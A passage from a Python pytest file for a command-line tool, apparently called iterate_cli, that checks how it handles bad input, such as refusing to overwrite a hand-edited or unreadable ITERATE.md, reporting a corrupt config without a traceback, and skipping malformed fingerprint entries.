        assert _coerce_line_number(-4) == 0
        assert _coerce_line_number("not-a-number") == 0
        assert _coerce_line_number(True) == 0


class TestOnboardRefusesWithoutUserMarkers:
    def test_onboard_refuses_and_keeps_file(self, fake_project: Path, monkeypatch) -> None:
        """onboard must refuse to overwrite an ITERATE.md without USER markers."""
        # Existing ITERATE.md without the USER-OWNED markers (hand-edited).
        (fake_project / "ITERATE.md").write_text("# Hand edited project\n", encoding="utf-8")
        data = _build_onboarding_data(fake_project)
        monkeypatch.setattr("iterate_cli.cli.run_wizard", lambda project_root: data)

        ret = cli_main(["onboard", "-p", str(fake_project)])
        assert ret == 1
        # File untouched (manual content survives).
        assert (fake_project / "ITERATE.md").read_text(encoding="utf-8") == "# Hand edited project\n"

    def test_onboard_refuses_on_unreadable_md(self, fake_project: Path, monkeypatch) -> None:
        (fake_project / "ITERATE.md").write_bytes(b"\xff\xfe\x00 broken utf8")
        data = _build_onboarding_data(fake_project)
        monkeypatch.setattr("iterate_cli.cli.run_wizard", lambda project_root: data)

        ret = cli_main(["onboard", "-p", str(fake_project)])
        assert ret == 1


class TestCorruptConfigPersonalizeCleanError:
    def test_personalize_save_returns_one_without_traceback(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        """A corrupt config must surface a clean error, not a bare traceback."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        # Corrupt the config.
        (fake_project / "iterate.config.yaml").write_text("[[[broken", encoding="utf-8")
        monkeypatch.setattr(
            "iterate_cli.personalize.run_personalize_wizard",
            lambda *a, **k: PersonalizationData(),
        )
        ret = cli_main(["personalize", "-p", str(fake_project)])
        assert ret == 1
        captured = capsys.readouterr()
        assert "Traceback" not in captured.err

    def test_personalize_clear_returns_one_without_traceback(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        (fake_project / "iterate.config.yaml").write_text("[[[broken", encoding="utf-8")
        ret = cli_main(["personalize", "-p", str(fake_project), "--clear", "--yes"])
        assert ret == 1
        captured = capsys.readouterr()
        assert "Traceback" not in captured.err


class TestReonboardRefusesUnreadableMd:
    def test_read_failure_aborts_with_failed_status(
        self, fake_project: Path, monkeypatch, capsys
    ) -> None:
        """full_reonboard must refuse (not degrade) when ITERATE.md is unreadable."""
        data = _build_onboarding_data(fake_project)
        write_onboarding_outputs(data, fake_project)
        (fake_project / "ITERATE.md").write_bytes(b"\xff\xfe\x00 not utf8")

        monkeypatch.setattr("iterate_cli.refresh.run_wizard", lambda *a, **k: data)
        status = full_reonboard(fake_project)
        assert status == REONBOARD_FAILED


class TestDriftSummaryHelpers:
    def test_none_unknown_and_summary(self) -> None:
        from iterate_cli.fingerprint import (
            DriftResult,
            drift_advice,
            drift_summary,
        )

        assert drift_summary(None) == "unknown"
        assert drift_summary(DriftResult()) == "none"
        drifting = DriftResult(changed=["package.json"])
        assert drift_summary(drifting) == "changed: package.json"
        assert drift_advice(drifting) is not None
        assert drift_advice(None) is None
        assert drift_advice(DriftResult()) is None


class TestCompareFingerprintsMalformed:
    def test_malformed_entries_do_not_crash(self) -> None:
        """Entries missing keys are skipped instead of raising KeyError."""
        stored = [{"path": "a.json", "sha256": "x"}, {"sha256": "no-path"}]
        current = [{"path": "a.json", "sha256": "y"}, "junk"]
        result = compare_fingerprints(stored, current)  # type: ignore[list-item]
        assert result.changed == ["a.json"]
        assert result.removed == []
